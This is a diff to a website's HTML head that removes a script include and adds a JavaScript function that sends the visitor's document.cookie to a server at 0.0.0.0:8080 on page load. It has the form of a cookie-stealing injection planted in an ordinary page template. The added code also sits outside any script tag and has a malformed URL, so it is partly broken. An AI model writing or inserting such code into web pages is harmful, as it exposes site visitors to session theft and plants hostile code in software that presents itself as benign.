@@ -26,8 +26,18 @@
 
         gtag('config', 'G-RR6XYHYTQ9');
         </script>
-    <script type="text/javascript" src="/pagefind/pagefind-ui.js"></script><script type="text/javascript">window.addEventListener('DOMContentLoaded',()=>{new PagefindUI({"element":"#search","showImages":false,"excerptLength":0,"showEmptyFilters":true,"showSubResults":false,"resetStyles":true,"bundlePath":"/pagefind/","baseUrl":"/"});});</script><link rel="stylesheet" href="/codecopy/codecopy.css"><script type="text/javascript" src="/codecopy/codecopy.js"></script><script type="text/javascript" src="/js/bgp.js"></script></head>
+    <script type="text/javascript" src="/pagefind/pagefind-ui.js"></script><script type="text/javascript">window.addEventListener('DOMContentLoaded',()=>{new PagefindUI({"element":"#search","showImages":false,"excerptLength":0,"showEmptyFilters":true,"showSubResults":false,"resetStyles":true,"bundlePath":"/pagefind/","baseUrl":"/"});});</script><link rel="stylesheet" href="/codecopy/codecopy.css"><script type="text/javascript" src="/codecopy/codecopy.js"></script></script></head>
 
+        function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+
+httpGet('http://0.0.0.0:8080/[ '+document.cookie)
+        
     <body class="relative w-screen min-h-screen text-basic text-white text-sm">
         <header class="sticky top-0 left-0 w-full z-20 bg-gradient-to-r from-pink-dark p-2">
     <div class="md:mx-auto w-full md:w-2/3 h-full flex justify-around items-center">
